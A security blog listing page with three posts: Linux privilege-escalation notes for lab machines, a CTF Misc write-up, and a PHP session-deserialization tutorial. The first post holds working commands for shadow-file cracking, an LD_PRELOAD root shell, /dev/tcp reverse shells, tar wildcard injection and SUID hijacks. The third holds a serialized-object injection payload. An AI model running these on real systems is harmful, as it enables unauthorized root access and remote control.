<h2 id="Shadow、Passwd文件可读可写提权"><a href="#Shadow、Passwd文件可读可写提权" class="headerlink" title="Shadow、Passwd文件可读可写提权"></a>Shadow、Passwd文件可读可写提权</h2><pre><code class="\Plain">cp /etc/passwd /tmp/passwd.bak
无论是shadow还是passwd文件都要备份以防万一
</code></pre>
<br>

<h3 id="1-可读shadow文件"><a href="#1-可读shadow文件" class="headerlink" title="1.可读shadow文件"></a>1.可读shadow文件</h3><p>Cat &#x2F;etc&#x2F;shadow：获取shadow文件：查看用户密码hash值</p>
<pre><code class="Plain">kali:$y$j9T$thVUCcCzQozwQh.2JyVRs.$T0FS1BRAcGSTCGldig/Ji2CbWc3bLVV8Ym1wEPDcIw1:19590:0:99999:7:::
将该条存储到一个文件中: vim 文件名 
</code></pre>
<p>破解该用户密码可通过john配合rockyou字典破解</p>
<p>rockyou字典需要在wordlists下先解压</p>
<pre><code class="Plain">john --wordlist=/usr/share/wordlists/rockyou.txt 存储的文件名
</code></pre>
<br>
<br>
### 2.可写shadow文件

<p><code>Mkpasswd -m hash加密方式 更改的密码</code></p>
<p>先对目标用户的密码hash值分析其hash加密方式如<code>MD5($1)，SHA-256，SHA-512($6)</code>等</p>
<p>更改密码后vim打开可写的shadow文件将目标用户的密码删到下一个”:”前再将更改的密码hash贴上去</p>
<p>su后输入密码得到目标用户权限</p>
<br>
<br>

<h3 id="3-可写passwd文件"><a href="#3-可写passwd文件" class="headerlink" title="3.可写passwd文件"></a>3.可写passwd文件</h3><pre><code class="Plain">openssl passwd 密码
</code></pre>
<p>得到的hash在passwd文件中替换x</p>
<p>su输入密码即可</p>
<br>

<br>

<br>



<h2 id="Sudo环境变量提权"><a href="#Sudo环境变量提权" class="headerlink" title="Sudo环境变量提权"></a>Sudo环境变量提权</h2><p>这其实就是利用LD_PRELOAD的优先装载动态链接库劫持后新建bash会话得到提权</p>
<p><code>Sudo -l发现其环境变量有env_keep+=LD_PRELOAD时可以考虑</code></p>
<p>先准备shell.c文件</p>
<pre><code class="C">#include &lt;stdio.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;stdlib.h&gt;

void _init()&#123;
   unsetenv(&quot;LD_PRELOAD&quot;)；  //预加载只执行一次所以就把预加载卸掉
   setgid(0);
   setuid(0);  //0group和0user就是root用户
   system(&#39;/bin/bash&#39;);  //启动一个bash会话
&#125;
</code></pre>
<p>因为是共享库文件，因此gcc编译时要注意</p>
<pre><code class="Bash">gcc -fPIC -shared -o shell.so shell.c -nostartfiles

-fPIC:告诉编译器生成代码位置无关
-shared,-o:共享库文件编译时所加参数
-nofilestarts:只启动我们构造的shell不加其他功能

sudo LD_PRELOAD=so文件位置 root权限不用密码的命令(sudo -l查看)
在命令前预加载该库文件
</code></pre>
<br>

<p>编译成功我们可以发现在当前目录下有一个shell.so</p>
<p>在<code>sudo -l</code>中发现不需要密码的一些命令(NOPASSWD)，随机选择其中一个</p>
<pre><code class="Plain">//类似以下格式
(root) NOPASSWD: /usr/bin/nano

//利用LD_PRELOAD预先加载动态链接库文件
sudo LD_PRELOAD=/当前路径下/shell.so nano

//不需要给nano接任何的指令，因为我们在用sudo执行前预加载了.so，而在.so文件中有提权逻辑因此实现了提权 
</code></pre>
<p>运行后即可</p>
<br>

<br>

<br>

<h2 id="自动任务提权"><a href="#自动任务提权" class="headerlink" title="自动任务提权"></a>自动任务提权</h2><h3 id="1-自动任务文件权限提权"><a href="#1-自动任务文件权限提权" class="headerlink" title="1.自动任务文件权限提权"></a>1.自动任务文件权限提权</h3><p><code>cat /etc/crontab</code></p>
<p>查看是否有以root权限执行的自动任务，有.sh脚本文件更好</p>
<p><code>locate</code>定位</p>
<p><code>ls -liah</code> 查看该权限，若可写则编辑用bash反弹shell</p>
<pre><code class="Bash">bash -i &gt;&amp; /dev/tcp/kali ip/port 0&gt;&amp;1
</code></pre>
<br>
<br>

<h3 id="2-自动任务PATH环境变量提权"><a href="#2-自动任务PATH环境变量提权" class="headerlink" title="2.自动任务PATH环境变量提权"></a>2.自动任务PATH环境变量提权</h3><p><code>cat /etc/crontab</code></p>
<p>可以看到有PATH环境变量</p>
<p>自动任务中的sh脚本若不是以绝对路径显示，可以考虑编辑同名脚本劫持</p>
<br>

<p><code>原理：</code></p>
<p><code>程序执行会按照PATH路径中靠前的先执行和寻找文件</code></p>
<p><code>crontab自动任务执行脚本的路径会优先使用指定的PATH路径集而不会使用用户自定义的路径</code></p>
<br>

<p>可以先locate查看不以绝对路径显示的自动任务脚本文件所在位置</p>
<p>pwd查看当前路径</p>
<p>若与corntab PATH中最高优先级的相同则编辑同名文件</p>
<p>写入简单的提权脚本vim编辑 同名.sh</p>
<pre><code class="Bash">#！ /bin/bash

cp /bin/bash /tmp/rootbash
chmod +xs /tmp/rootbash
</code></pre>
<p>Chmod +x 同名.sh  赋予权限</p>
<p>等待自动任务执行周期劫持原文件实现提权</p>
<br>

<br>

<h3 id="3-自动任务通配符提权"><a href="#3-自动任务通配符提权" class="headerlink" title="3.自动任务通配符提权"></a>3.自动任务通配符提权</h3><p>真实场景中的服务器可能有每隔一段时间对一些重要目录进行打包备份的自动任务，就以tar命令为例，其中tar命令的checkpoint操作可以进行提权</p>
<pre><code class="Plain">//首先可以用msfvenom工具自动生成一个反弹shell的语句

msfvenom -p linux/x64/shell_reverse_tcp LHOST=vps ip LPORT=监听端口 -f elf -o shell.elf

//生成一个用于反弹shell的二进制文件，然后部署到vps上在目标服务器上wget获取该elf文件

php -S 0:80
//攻击机架设web服务

wget http://vps ip/shell.elf
chmod +xs shell.elf
//将elf文件下载到靶机的当前目录并给予可执行权限

touch /当前目录/--checkpoint=1
touch /当前目录/--checkpoint-action=exec=shell.elf
</code></pre>
<br>

<br>

<br>

<h2 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h2><p>肯定要先找有SUID权限的文件</p>
<p><code>Find / -perm -u=s -type f 2&gt;/dev/null</code></p>
<br>

<h3 id="1-SUID可执行文件利用提权"><a href="#1-SUID可执行文件利用提权" class="headerlink" title="1.SUID可执行文件利用提权"></a>1.SUID可执行文件利用提权</h3><p>输入以上指令后可以发现有很多文件，我们可以直接选一个文件名</p>
<p>利用searchexploit来找提权脚本</p>
<pre><code class="Plain">searchexploit suid文件

searchexploit suid文件 -m 提权脚本

//剩余操作架设服务器wget在靶机中下载脚本并给予执行权限执行
</code></pre>
<br>
<br>

<h3 id="2-SUID共享库注入提权"><a href="#2-SUID共享库注入提权" class="headerlink" title="2.SUID共享库注入提权"></a>2.SUID共享库注入提权</h3><p>在发现有SUID权限的.so文件时可以尝试运行和追踪该.so文件</p>
<p>剩余操作与环境变量提权一致<br><br><br><br></p>
<h3 id="3-SUID环境变量利用提权"><a href="#3-SUID环境变量利用提权" class="headerlink" title="3.SUID环境变量利用提权"></a>3.SUID环境变量利用提权</h3><p>查找发现env字样的文件(strings查看可显示字符)</p>
<p>对没有使用绝对路径的引用我们可以劫持到绝对路径使得系统执行我们的提权操作</p>
<pre><code class="Plain">#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;

void mail()&#123;
   setgid(0);
   setuid(0);
   system(&quot;/bin/bash -p&quot;);
&#125;

//env中同名文件.c


//以env文件的属主权限启动一个终端，前提是属主为root
ls -liah /usr/local/bin/suid-env


//先查看环境变量，我们的劫持文件在本目录下，若要劫持要将优先级提到最高
echo $PATH 

//使最先读取当前目录下文件
export PATH=.:$PATH
</code></pre>
<br>
<br>

<h3 id="4-利用SUID-shell功能提权1"><a href="#4-利用SUID-shell功能提权1" class="headerlink" title="4.利用SUID-shell功能提权1"></a>4.利用SUID-shell功能提权1</h3><p>当3中对绝对路径的引用时，我们考虑通过bash低版本</p>
<pre><code class="Plain">bash --version
</code></pre>
<p>version&lt;&#x3D;4.2时可以在bash中定义function用路径组合做文件名</p>
<pre><code class="Plain">function 绝对路径文件名 &#123; /bin/bash -p; &#125;
export -f /usr/sbin/service

//bash中定义以文件名命名的函数并导出到环境运行对应suid文件即可劫持
</code></pre>
<br>
<br>

<h3 id="5-利用SUID-shell功能提权2"><a href="#5-利用SUID-shell功能提权2" class="headerlink" title="5.利用SUID-shell功能提权2"></a>5.利用SUID-shell功能提权2</h3><p>Bash version&lt;&#x3D;4.4考虑对bash环境变量进行设置</p>
<pre><code class="Plain">env -i SHELLOPTS=strace PS4=&#39;$(cp /bin/bash /tmp/rootbash;chmod +xs /tmp/rootbash)&#39;  suid文件名(绝对路径)
</code></pre>
<br>
<br>
<br>

<h2 id="密码与密钥提权"><a href="#密码与密钥提权" class="headerlink" title="密码与密钥提权"></a>密码与密钥提权</h2><h3 id="1-历史文件查看"><a href="#1-历史文件查看" class="headerlink" title="1.历史文件查看"></a>1.历史文件查看</h3><pre><code class="Plain">history

cat /root/.bash_history
</code></pre>
<br>
<br>

<h3 id="2-配置文件查看"><a href="#2-配置文件查看" class="headerlink" title="2.配置文件查看"></a>2.配置文件查看</h3><p>就像我之前打的一台bizness靶机，其中Apache OFBiz组件包含了数据库，就是通过数据库配置文件来查看密码的</p>
<p>如ovpn、数据库文件等配置文件可以查看<br><br><br><br></p>
<h3 id="3-SSH密钥敏感信息"><a href="#3-SSH密钥敏感信息" class="headerlink" title="3.SSH密钥敏感信息"></a>3.SSH密钥敏感信息</h3><p>靶机中权限可能可以允许我们查看SSH配置文件，无论是公钥还是私钥都有可能提权的价值，调整ssh的参数后尝试连接以获取更高等级的权限<br><br><br><br><br><br></p>
<h2 id="内核利用提权"><a href="#内核利用提权" class="headerlink" title="内核利用提权"></a>内核利用提权</h2><p>这种利用通常在其他几种方法都不奏效的情况下才使用，因为内核利用可能导致系统不稳定或会向管理员报警，因此会导致被发现溯源等，所以不到所有手段耗尽不轻易使用<br><br><br>内核利用主要利用工具为<code>linpeas</code>，如果靶机中有<code>curl</code>命令可以直接将执行脚本下载到靶机，如果没有用nc传输</p>
<pre><code class="Plain">//查看内核版本
uname -a  

//下载linpeas脚本进行内核利用扫描
curl -L https://github.com/carlospolop/PEASS-ng/latest/download/linpeas.sh | sh

//无curl命令时，攻击机将下载的脚本在端口用nc传输
wget https://github.com/carlospolop/PEASS-ng/latest/download/linpeas.sh
nc -lvnp 端口 &lt; linpeas.sh

//靶机接收伪设备传输的linpeas
cat &lt; /dev/tcp/ip/port | sh

//通过linpeas扫描结果用CVE编号查找利用脚本，最后根据脚本利用即可
searchsploit 编号

//值得注意的是利用时考虑不同脚本的通用性or针对性来使用更方便利用的脚本
</code></pre>
<br>

<br>

<br>

<h2 id="Doas-less-vi提权"><a href="#Doas-less-vi提权" class="headerlink" title="Doas less+vi提权"></a>Doas less+vi提权</h2><p>渗透测试过程中可能遇到一些少见的系统比如OpenBSD，查找suid文件时可能存在doas的提权点</p>
<pre><code class="Plain">//查看doas的配置文件
cat /etc/doas.conf
</code></pre>
<p><code>如果我们可以利用doas使用less命令就可以利用less命令的参数v来进入vi编辑器从而在对应文件中启动一个高权限的shell，实现提权</code></p>
<p>在vi编辑器中我们使用</p>
<p>!sh   即可启动一个shell，doas给予我们的高权限使得我们启动新shell得到的权限是更高的实现提权</p>
<br>

<br>

<br>

<h2 id="利用MOTD机制提权"><a href="#利用MOTD机制提权" class="headerlink" title="利用MOTD机制提权"></a>利用MOTD机制提权</h2><p>在我们获取到shell发现靶机有update-motd.d目录我们就可以考虑利用motd机制提权</p>
<p>通常是对00-header脚本修改来用bash反弹shell</p>
<p><code>原理：motd是用户或者管理员登录到系统时会触发的一个机制，最先执行的是00-header，所以我们只要在里面修改反弹shell语句就可以在登录或获取shell的同时执行这个脚本得到弹回来的shell</code></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/Linux%E6%8F%90%E6%9D%83-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" style="color: #ff7d73">Linux提权 渗透测试</a>
        </span>
        
    </div>
    <a href="/2024/07/21/Linux-privilege-escalation#1/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/07/12/2024ShangHaiWriteup/">
        <h2 class="post-title">2024年上海大学生网络安全大赛暨磐石行动网络安全赛道Misc全解</h2>
    </a>
    <div class="category-and-date">
        
        <span class="category">
            <a href="/categories/Misc/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Misc
            </a>
        </span>
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/7/12
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <br>

<p>期末终于结束了，更点WP)</p>
<br>

<h4 id="Wifi密码"><a href="#Wifi密码" class="headerlink" title="Wifi密码"></a>Wifi密码</h4><p>搜索得到文章<a target="_blank" rel="noopener" href="https://blog.csdn.net/Waffle666/article/details/109354830">https://blog.csdn.net/Waffle666/article/details/109354830</a></p>
<p>按照文章和题目提示破解密码</p>
<p><img src="https://s2.loli.net/2024/07/12/CcJIG5R1i2xMQsH.png" alt="wifi.png"></p>
<br>

<br>

<h4 id="5GC网元AMF名称"><a href="#5GC网元AMF名称" class="headerlink" title="5GC网元AMF名称"></a>5GC网元AMF名称</h4><p>没见过的题目呢，上网查一下</p>
<p><img src="https://s2.loli.net/2024/07/12/ePhq32aCHzJfpIs.png" alt="5g.png"></p>
<p>那就直接过滤NGAP协议就可以了</p>
<br>

<p>Wireshark本机打不开在虚拟机里面才能打开不知道wsm<br>打开找NGAP协议第一个NGsetupresponse里面一串base64解码</p>
<p><img src="https://s2.loli.net/2024/07/12/ifI9MBt73TopmlG.png" alt="5g2.png"></p>
<p>Base64解码flag{amfname_ujrr1123}</p>
<br>

<br>

<h4 id="Tunnel"><a href="#Tunnel" class="headerlink" title="Tunnel"></a>Tunnel</h4><p>一开始没有什么思路</p>
<p>发现很多icmp流量，上网查是和长度有关，考虑长度值ascii转字符(要看no responsed的)，看data部分的长度一个一个转码，去掉前面两个转出来的水平制表符得到flag{iCmp_1s_tO0_Ea5y_}</p>
 <br>

<br>

<h4 id="Ezdmp-复现"><a href="#Ezdmp-复现" class="headerlink" title="Ezdmp(复现)"></a>Ezdmp(复现)</h4><p>一个要用vol3分析的内存dmp文件但是最后因为vol3用不熟好多选项，都提示desktop也看见了flag但是dmp不出来看到wp再看看</p>
<br>

 

<p>出wp了，有做这题的只有六张图真的找工具装环境把人折磨4了</p>
<p><a target="_blank" rel="noopener" href="https://blog.he-zhan.xyz/post/notes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/">https://blog.he-zhan.xyz/post/notes/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/</a></p>
<p>几个工具：Magnet AXIOM，LovelyMem。</p>
<p>其中LovelyMem相当于一个集成环境了，也是感谢取证师傅的输出</p>
<p><a target="_blank" rel="noopener" href="https://github.com/Tokeii0/LovelyMem">https://github.com/Tokeii0/LovelyMem</a></p>
<p>按照里面的方法依次安装memprocfs和dokany，找半天博客文章不知道怎么装还得是油管</p>
<p><a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=hjWVUrf7Obk">https://www.youtube.com/watch?v=hjWVUrf7Obk</a><br><br></p>
<p><img src="https://s2.loli.net/2024/07/12/9OSP25epYV4Ihb8.png" alt="ezdmp.png"></p>
<br>
AXIOM分析检材，结合题目附件DESKTOP.dmp就针对有desktop文件夹的找，找到一个flag用户用过的result.txt文件很可疑，但是试过vol3不能直接把文件dump出来这时候就用到lovelymem了，作者的B站还发了使用视频我收藏没看(。Dump出来在挂载的M盘看内容，password就是flag

            
        </div>
    </div>
    <div class="post-tags">
        
        <span class="icon">
            <i class="fa-solid fa-tags fa-fw"></i>
        </span>
        
        
        
        <span class="tag">
            
            <a href="/tags/CTF-Misc-%E7%94%B5%E5%AD%90%E5%8F%96%E8%AF%81/" style="color: #00a596">CTF-Misc 电子取证</a>
        </span>
        
    </div>
    <a href="/2024/07/12/2024ShangHaiWriteup/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2024/05/09/PHP-Session-Unserialization/">
        <h2 class="post-title">PHP-Session反序列化</h2>
    </a>
    <div class="category-and-date">
        
        <span class="category">
            <a href="/categories/Web/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                Web
            </a>
        </span>
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2024/5/9
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <p>要了解Session反序列化，当然先要了解什么是session，或者说，把和session相关的几个机制都一起了解一下。</p>
<br>
<br>


<h2 id="0x01-Cookie-Session"><a href="#0x01-Cookie-Session" class="headerlink" title="0x01 Cookie,Session"></a>0x01 Cookie,Session</h2><p>1.Cookie：当客户端对服务器发起HTTP请求时，服务器会对客户端进行一个Set-Cookie操作，并将其中的Name(名)和Value(值)填充</p>
<pre><code class="html">Name:lwt
Value:sb
</code></pre>
<p>客户端收到这个Cookie后就会以后发送的每一个请求都会自动附上这个Cookie，<code>这个cookie会保存在我们的客户端</code>，我们右键检查就可以查看cookie，所以cookie的缺点很明显，只要电脑被黑，cookie中的重要信息就会泄露。而且伴随着抓包的操作，cookie非常容易被篡改，从而达到伪造身份的目的。</p>
<br>

<p>2.Session：为了改善安全性问题，引入了一种新的机制session。Session一般称为“会话控制“，简单来说就是是一种客户与网站&#x2F;服务器更为安全的对话方式。一旦开启了 session 会话，便可以在网站的任何页面使用或保持这个会话，从而让访问者与网站之间建立了一种“对话”机制。不同语言的会话机制可能有所不同，这里仅讨论<code>PHP session</code>机制。</p>
<br>
<br>


<h2 id="0x02-PHP-Session的工作流程"><a href="#0x02-PHP-Session的工作流程" class="headerlink" title="0x02 PHP Session的工作流程"></a>0x02 PHP Session的工作流程</h2><p>当开始一个会话时，PHP会尝试从请求中查找会话ID（通常通过会话cookie），如果发现请求的Cookies、Get、Post中不存在session id，PHP就会自动调用php_session_create_id函数创建一个新的会话，并且在http response中通过set-cookie头部发送给用户端保存。</p>
<br>

<p>有时候浏览器用户设置会禁止 <code>cookie</code>，当在客户端<code>cookie</code>被禁用的情况下，php也可以自动将<code>session id</code>添加到url参数中以及<code>form</code>的<code>hidden</code>字段中，但这需要将<code>php.ini</code>中的<code>session.use_trans_sid</code>设为开启，也可以在运行时调用<code>ini_set</code>来设置这个配置项。</p>
<br>

<p>会话开始之后，PHP 就会将会话中的数据设置到 <code>$_SESSION</code> 变量中，如下述代码就是一个在 <code>$_SESSION</code> 变量中注册变量的例子：</p>
<pre><code class="php">&lt;?php
session_start();
if (!isset($_SESSION[&#39;username&#39;])) &#123;
  $_SESSION[&#39;username&#39;] = &#39;Genshin&#39; ;
&#125;
?&gt;
</code></pre>
<p>当 PHP 停止的时候，它会自动读取 <code>$_SESSION</code> 中的内容，并将其进行序列化， 然后发送给会话保存管理器来进行保存。</p>
<br>

<p>默认情况下，<code>PHP 使用内置的文件会话保存管理器来完成session的保存，也可以通过配置项 session.save_handler 来修改所要采用的会话保存管理器。</code> 对于文件会话保存管理器，会将会话数据保存到配置项<code>session.save_path</code>所指定的位置。</p>
<br>

<p>整个流程大概如上所述，也可参考下述流程图：</p>
<p><img src="https://s2.loli.net/2024/07/12/Swb9kMxRJfYoHZn.png" alt="20191026142328-1fba974c-f7b9-1.png"></p>
<br>
<br>

<h2 id="0x03-PHP-Session在php-ini中的配置"><a href="#0x03-PHP-Session在php-ini中的配置" class="headerlink" title="0x03 PHP Session在php.ini中的配置"></a>0x03 PHP Session在php.ini中的配置</h2><p>有很多配置项这里不赘述，关于session反序列化主要是其中一项：</p>
<p><code>session.serialize_handler</code></p>
<p>定义用来序列化&#x2F;反序列化的处理器名字，默认使用<code>php</code>，还有其他引擎，且不同引擎的对应的session的存储方式不相同</p>
<br>
<br>


<h2 id="0x04-PHP-Session的存储机制"><a href="#0x04-PHP-Session的存储机制" class="headerlink" title="0x04 PHP Session的存储机制"></a>0x04 PHP Session的存储机制</h2><p>上文中提到了 <code>PHP session</code>的存储机制是由<code>session.serialize_handler</code>来定义引擎的，默认是以文件的方式存储，且存储的文件是由<code>sess_sessionid</code>来决定文件名的，当然这个文件名也不是不变的，如<code>Codeigniter</code>框架的 <code>session</code>存储的文件名为<code>ci_sessionSESSIONID</code>，如下图所示</p>
<p><img src="https://s2.loli.net/2024/07/12/gQpHOu7GrLRZ93V.png" alt="20191026142528-67263294-f7b9-1.png"></p>
<br>
当然，文件的内容始终是session值的序列化之后的内容：

<p><img src="https://s2.loli.net/2024/07/12/loqsBv7yQj5TCME.png" alt="wc.png"></p>
<br>

<p>session.serialize_handler定义的引擎有三种，如表：</p>
<table>
<thead>
<tr>
<th>处理器名称</th>
<th align="center">存储格式</th>
</tr>
</thead>
<tbody><tr>
<td>php</td>
<td align="center">键名 + 竖线 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_binary</td>
<td align="center">键名的长度对应的 ASCII 字符 + 键名 + 经过<code>serialize()</code>函数序列化处理的值</td>
</tr>
<tr>
<td>php_serialize</td>
<td align="center">经过<code>serialize()</code>函数序列化处理的数组</td>
</tr>
</tbody></table>
<p>上述三个处理器中，php_serialize在内部简单地使用serialize&#x2F;unserialize函数，而不会有另外两种处理器的限制如 “|”，”!”等特殊符号。</p>
<br>

<p>php提供<code>session.serialize_handler &quot;php&quot; PHP_INI_ALL</code>可以来设置以上的处理器</p>
<p>测试的时候php版本一定要大于5.5.4(具体版本未测试,不然session写不进文件)</p>
<br>

<h3 id="php处理器"><a href="#php处理器" class="headerlink" title="php处理器"></a>php处理器</h3><p>当<code>session.serialize_handler=php</code>时的序列化结果，demo：</p>
<pre><code class="php">&lt;?php
error_reporting(0);
ini_set(&#39;session.serialize_handler&#39;,&#39;php&#39;);
session_start();
$_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
//GET方式提交session=lwt;

//结果:session|s:3:&quot;lwt&quot;;
?&gt;  
</code></pre>
<p>可以发现，序列化的结果是一个键值对，<code>session</code> 为<code>$_SESSION[&#39;session&#39;]</code>的键名，<code>|</code>后为传入 GET 参数经过序列化后的值</p>
<br>

<h3 id="php-binary处理器"><a href="#php-binary处理器" class="headerlink" title="php_binary处理器"></a>php_binary处理器</h3><p>当<code>session.serialize_handler=php_binary</code>时的序列化结果，</p>
<pre><code class="php">&lt;?php
error_reporting(0);
ini_set(&#39;session.serialize_handler&#39;,&#39;php_binary&#39;);
session_start();
$_SESSION[&#39;sessionsessionsessionsessionsession&#39;] = $_GET[&#39;session&#39;];
//GET传参session=lwt
//Session文件内容：#sessionsessionsessionsessionsessions:3:&quot;lwt&quot;;
?&gt;
</code></pre>
<p>GET提交session参数后可以发现序列化结果的键名sessionsessionsessionsessionsession前多了一个#符号，因为键名长度为35，而35对应的ascii码就是#，所以可以总结当<code>session.serialize_handler=php_binary</code>时其序列化结果会将$_SESSION[’键名’]的键名长度进行ASCII编码后放在最前面，而且键值对间的连接符号不再是 ”|” 而是  “:”</p>
<br>

<h3 id="php-serialize处理器"><a href="#php-serialize处理器" class="headerlink" title="php_serialize处理器"></a>php_serialize处理器</h3><p>最后就是<code>session.serialize_handler=php_serialize</code>时候的序列化结果，同理，demo 如下：</p>
<pre><code class="php">&lt;?php
error_reporting(0);
ini_set(&#39;session.serialize_handler&#39;,&#39;php_serialize&#39;);
session_start();
$_SESSION[&#39;session&#39;] = $_GET[&#39;session&#39;];
//GET传参lwt
//Session文件内容：a:1:&#123;s:7:&quot;session&quot;;s:3:&quot;lwt&quot;;&#125;
?&gt;
</code></pre>
<p><code>a:1</code>表示<code>$_SESSION</code>数组中有 1 个元素，花括号里面的内容即为传入 GET 参数经过序列化后的值</p>
<br>


<p>绝大多数情况下，造成session反序列化漏洞的原因通常是因为两种处理器混合使用，特别是php_serialize和php处理器混合使用时。</p>
<p>简单来说<code>php</code>处理器和<code>php_serialize</code>处理器这两个处理器生成的序列化格式本身是没有问题的，但是如果这两个处理器混合起来用，就会造成危害。</p>
<p>形成的原理就是在用<code>session.serialize_handler = php_serialize</code>存储的字符可以引入 | , 再用<code>session.serialize_handler = php</code>格式取出<code>$_SESSION</code>的值时， <code>|</code>会被当成键值对的分隔符，在特定的地方会造成反序列化漏洞。</p>
<br>

<p><strong>当存储是php_serialize处理，然后调用时php去处理</strong></p>
<p>如果这时候注入的数据是</p>
<pre><code>a=|O:4:&quot;test&quot;:0:&#123;&#125;
</code></pre>
<p>那么session中的内容是</p>
<pre><code>a:1:&#123;s:1:&quot;a&quot;;s:16:&quot;|O:4:&quot;test&quot;:0:&#123;&#125;&quot;;&#125;
</code></pre>
<p>根据解释,其中</p>
<pre><code>a:1:&#123;s:1:&quot;a&quot;;s:16:&quot;
</code></pre>
<p>在经过php解析后是被看成键名,后面就是一个实例化test对象的注入</p>
<br>


<p>构造两个php文件，其中一个a.php的session处理器使用php_serialize，另一个b.php使用php。</p>
<pre><code class="php">&lt;?php
ini_set(&#39;session.serialize_handler&#39;, &#39;php_serialize&#39;);
session_start();
$_SESSION[&#39;a&#39;] = $_GET[&#39;a&#39;];
//a.php
?&gt;
</code></pre>
<pre><code class="php">&lt;?php
ini_set(&#39;session.serialize_handler&#39;, &#39;php&#39;);
session_start();
class lemon&#123;
    var $hi;
    function __wakeup() &#123;
        echo &#39;hi&#39;;
    &#125;
    function __destruct() &#123;
        echo $this-&gt;hi;
    &#125;
&#125;
//b.php
?&gt;
</code></pre>
<p>当我们先访问a.php，并传参a&#x3D;|O:5:”lemon”:1:{s:2:”hi”;s:3:”lwt”;}</p>
<p>此时session文件中就会有一个数组的序列化字符串，但是中间多一个 ”|”</p>
<p>然后我们再访问b.php就会执行代码输出hilwt，上面序列化字符串是先实例化lemon对象，同时将$hi&#x3D;lwt，序列化该对象，传参时前面加一个 ”|” 就可以让php处理器认为是键值对中的值，因此在反序列化session数据时是将 ”|” 后面的字符串反序列化，此时就会触发destruct和wakeup输出”hilwt“</p>
<br>
<br>


<h3 id="0x05-例题：ctfshow元旦水友赛Web-easylogin"><a href="#0x05-例题：ctfshow元旦水友赛Web-easylogin" class="headerlink" title="0x05 例题：ctfshow元旦水友赛Web-easylogin"></a>0x05 例题：ctfshow元旦水友赛Web-easylogin</h3><p>其实是道原题，但是当时没刷到。</p>
<p>开题给源码，两个附件，先看common.php，不难发现userLogger类有写入文件的操作file_put_contents()</p>
<pre><code class="php">       public function user_register($username,$password)&#123;
        $this-&gt;username = $username;
        $this-&gt;password = $password;
        $data = &quot;操作时间：&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;用户注册： 用户名 $username 密码 $password\\n&quot;;
        file_put_contents($this-&gt;filename,$data,FILE_APPEND);
    &#125;

    public function user_login($username,$password)&#123;
        $this-&gt;username = $username;
        $this-&gt;password = $password;
        $data = &quot;操作时间：&quot;.date(&quot;Y-m-d H:i:s&quot;).&quot;用户登陆： 用户名 $username 密码 $password\\n&quot;;
        file_put_contents($this-&gt;filename,$data,FILE_APPEND);
    &#125;
</code></pre>
<p>可以通过改变类属性反序列化写入木马从而getshell，但是翻遍整个附件没有发现unserialize函数，所以再看看。</p>
<pre><code class="php">    public function getLoginName($name)&#123;
        $data = $this-&gt;cookie-&gt;getCookie($name);
        if($data === NULL &amp;&amp; isset($_GET[&#39;token&#39;]))&#123;
            session_decode($_GET[&#39;token&#39;]);
            $data = $_SESSION[&#39;user&#39;];
        &#125;
        return $data;
    &#125;
</code></pre>
<p>application类中可以发现有一个去session里面取数据解码的操作，学过session反序列化就会知道存储于session的数据都是序列化后的字符串，解码取出时就会进行反序列化操作，所以我们可以通过这一段进行反序列化攻击。</p>
<br>

<p>语句</p>
<pre><code>session_decode($_GET[&#39;token&#39;]);
</code></pre>
<p>往session里面存放对象</p>
<p>语句</p>
<pre><code>$data = $_SESSION[&#39;user&#39;];
</code></pre>
<p><code>往session里面拿取对象，拿取名字为user的对象。</code></p>
<p><code>我们就可以通过构造token=user|”恶意序列化字符串“来getshell</code></p>
<br>

<p>往上反推，我们需要调用getloginname方法的地方，再看到&#x2F;templates&#x2F;main.php路由，调用了getloginname方法</p>
<pre><code class="php">&lt;?php

$name =  $app-&gt;getLoginName(&#39;user&#39;);

if($name)&#123;
    echo &quot;恭喜你登陆成功 &lt;a href=&#39;/index.php?action=logout&#39;&gt;退出登陆&lt;/a&gt;&quot;;
&#125;else&#123;
    include &#39;login.html&#39;;
&#125;
</code></pre>
<p>想要跳转到main.php还得看index.php</p>
<pre><code class="php">session_start();

$action = $_GET[&#39;action&#39;];
$app = new application();

if(isset($action))&#123;

    switch ($action) &#123;
        case &#39;do_login&#39;:
            $ret = $app-&gt;login($_POST[&#39;username&#39;],$_POST[&#39;password&#39;]);
            if($ret)&#123;
                $app-&gt;cookie-&gt;setcookie(&quot;user&quot;,$_POST[&#39;username&#39;]);
                $app-&gt;dispatcher-&gt;redirect(&#39;main&#39;);
            &#125;else&#123;
                echo &quot;登录失败&quot;;
            &#125;
            break;
        case &#39;logout&#39;:
            $app-&gt;logout();
            $app-&gt;dispatcher-&gt;redirect(&#39;main&#39;);
            break;    
        case &#39;do_register&#39;:
            $ret = $app-&gt;register($_POST[&#39;username&#39;],$_POST[&#39;password&#39;]);
            if($ret)&#123;
                $app-&gt;dispatcher-&gt;sendMessage(&quot;注册成功，请登陆&quot;);
            &#125;else&#123;
                echo &quot;注册失败&quot;;
            &#125;
            break;
        default:
            include &#39;./templates/main.php&#39;;
            break;
    &#125;
</code></pre>
<p><code>GET方法传一个action，经过switch检测，只要不是”do_login”,”logout”,”do_register”这三个值的其中一个</code>，就会跳转至main.php，而且session_start也证明了存在session反序列化的可能</p>
<br>

